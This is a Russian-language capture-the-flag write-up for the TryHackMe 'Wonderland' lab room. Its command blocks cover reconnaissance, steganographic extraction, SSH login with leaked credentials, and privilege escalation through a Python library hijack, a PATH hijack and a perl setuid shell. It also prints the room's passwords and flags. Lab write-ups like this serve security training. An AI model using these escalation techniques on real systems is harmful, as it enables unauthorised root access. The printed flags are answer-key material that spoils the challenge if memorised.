[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Wonderland](https://tryhackme.com/r/room/wonderland) 

Всего 1 заданиe:
## Задание 1
Войдите в Страну Чудес и захватите флаги.



### Ответьте на вопросы ниже
Получить флаг в user.txt
```commandline
nmapj -sC -sV <IP>
/data/src/dirsearch/dirsearch.py -u http://10.10.125.113/ -E -w /data/src/wordlists/directory-list-2.3-medium.txt 
wget http://<IP>/img/white_rabbit_1.jpg
steghide info white_rabbit_1.jpg 
steghide extract -sf white_rabbit_1.jpg 
cat hint.txt 
# follow the r a b b i t
curl -s http://<IP>/r/a/b/b/i/t/
# alice:HowDothTheLittleCrocodileImproveHisShiningTail
ssh alice@<IP>
cat /root/user.txt
```

```commandline
thm{"Curiouser and curiouser!"}
```
+ 20
Повысьте свои привилегии, какой флаг в root.txt?
```commandline
ls -la /home
cat walrus_and_the_carpenter.py
python3 walrus_and_the_carpenter.py 
sudo -l
cat > random.py << EOF

import os
os.system("/bin/bash")
EOF

sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
whoami
file teaParty
./teaParty

cat > date << EOF
#!/bin/bash
/bin/bash
EOF

chmod +x date
export PATH=/home/rabbit:$PATH
./teaParty 
whoami
cd /home/hatter/
cat password.txt
# WhyIsARavenLikeAWritingDesk?
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
whoami
cat /home/alice/root.txt
```
```commandline
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)